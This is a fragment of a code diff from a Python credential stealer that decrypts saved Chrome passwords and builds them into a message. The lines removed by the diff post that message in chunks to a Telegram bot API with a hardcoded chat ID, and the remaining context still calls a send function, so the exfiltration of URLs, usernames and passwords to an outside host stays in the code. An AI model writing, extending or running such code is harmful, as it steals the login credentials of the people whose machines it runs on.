@@ -170,30 +170,5 @@ for p in passwords_v20:
     message += f"URL: {url_}\nUsername: {username}\nPassword: {password}\n" + ("-" * 50) + "\n"
 
 
-
-def send_telegram_message1(message):
-    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-    payload = {
-        'chat_id': 6601089119,
-        'text': message,
-        'parse_mode': 'Markdown'
-    }
-    response = requests.post(url, data=payload)
-    return response.json()
-
-def send_long_message1(text):
-    max_length = 4096
-    for i in range(0, len(text), max_length):
-        part = text[i:i+max_length]
-        send_telegram_message(part)
-
-# Construct the full message
-message = "\nDecrypted Chrome Passwords:\n" + ("-" * 50) + "\n"
-for p in passwords_v20:
-    url_ = p[0]
-    username = p[1]
-    password = decrypt_password_v20(p[2])
-    message += f"URL: {url_}\nUsername: {username}\nPassword: {password}\n" + ("-" * 50) + "\n"
-
 # Send the message in chunks if it's too long
 aend_long_message(message)
